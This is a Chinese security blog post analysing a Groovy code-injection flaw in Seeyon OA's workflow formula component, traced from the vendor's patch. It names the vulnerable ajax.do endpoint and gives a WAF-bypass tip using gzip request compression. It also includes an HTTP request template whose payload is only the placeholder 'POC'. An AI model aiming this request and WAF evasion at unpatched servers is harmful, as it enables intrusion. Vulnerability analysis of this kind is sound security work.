致远OA代码审计系列七-公式组件代码执行漏洞分析
========================

原创 作者:archive 公号:安全回忆录 发布时间:2023-12-06 0:00 发表于北京

原文地址：[致远OA代码审计系列七-公式组件代码执行漏洞分析](https://mp.weixin.qq.com/s/RE_KSqh0Y-X8AzM36EJ0IA)

**漏洞描述:**

致远OA登录后用户可通过公式组件功能，该功能方法没有对用户参数进行任何过滤检测,也没有使用Groovy相关安全机制, 导致存在Groovy代码注入漏洞。

******适用版本:******

适配版本范围：A6/A8 V6.1至V8.1全系列版本。

**漏洞分析:**

根据致远官方补丁,发现在ActionRunner的getConditionValue中增加了log方法进行安全校验。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMvFuFQ2XHWXSd8p61xQPJRjyYkJ17yWceIM7icIGkAWHr50uL0AibRstrENnwkclyDyrrvW5ODhibklQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMvFuFQ2XHWXSd8p61xQPJRjKjHx9ibw28oibuicQxx9yTqu2ic1ibDn75dP4mzX60yicQtwDMQetDowoicyw/640?wx_fmt=png&from=appmsg)

不难发现getConditionValue方法最终会通过Groovy执行相关代码公式, 未对参数进行相关过滤, 存在Groovy代码执行漏洞。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMvFuFQ2XHWXSd8p61xQPJRjM80srGqibAQzPCUEicqccbxEWd438PHDGRgmiaab5icEiadI0w5j6qsNP7Q/640?wx_fmt=png&from=appmsg)

通过全局搜索ActionRunner.getConditionValue关键字, 发现在WorkflowInnerApiManagerImpl中存在3处调用,这里采用getConditionValue方法。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMvFuFQ2XHWXSd8p61xQPJRjbWpyQPoA5zj9nxHX5hoWXjNAr4sBT7cHgbSIXibrrjCf4trltwzPZTg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8bCtiadxaTMvFuFQ2XHWXSd8p61xQPJRjqSSqaS82uZZ989bIbnrUXtGTTVSh5rcloBGdQGoadcnVicA0Lia4symQ/640?wx_fmt=png&from=appmsg)

通过ajax.do路由直接访问, requestCompress参数对arguments内容进行加密, 绕过waf等检测。

```cs
/seeyon/ajax.do;Jsessionid=a?method=ajaxAction&managerName=workflowInnerApiManager&requestCompress=gzip
```

最终利用POC  

```http
POST /seeyon/ajax.do;Jsessionid=a?method=ajaxAction&managerName=workflowInnerApiManager&requestCompress=gzip HTTP/1.1
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 617
Host: 192.168.246.4
Connection: close
User-Agent: Apache-HttpClient/4.5.13 (Java/1.8.0_321)
Cookie: JSESSIONID=4A751D0570EA20C1C0FFFFDEE55D0F46; login_locale=zh_CN
Accept-Encoding: gzip, deflate


managerMethod=getConditionValue&arguments=POC
```

**总结:**

该漏洞由于公式组件功能未对参数进行过滤检测导致, 致远官方于2022年4月11日发布补丁修复该漏洞,采用的黑名单方式进行修复。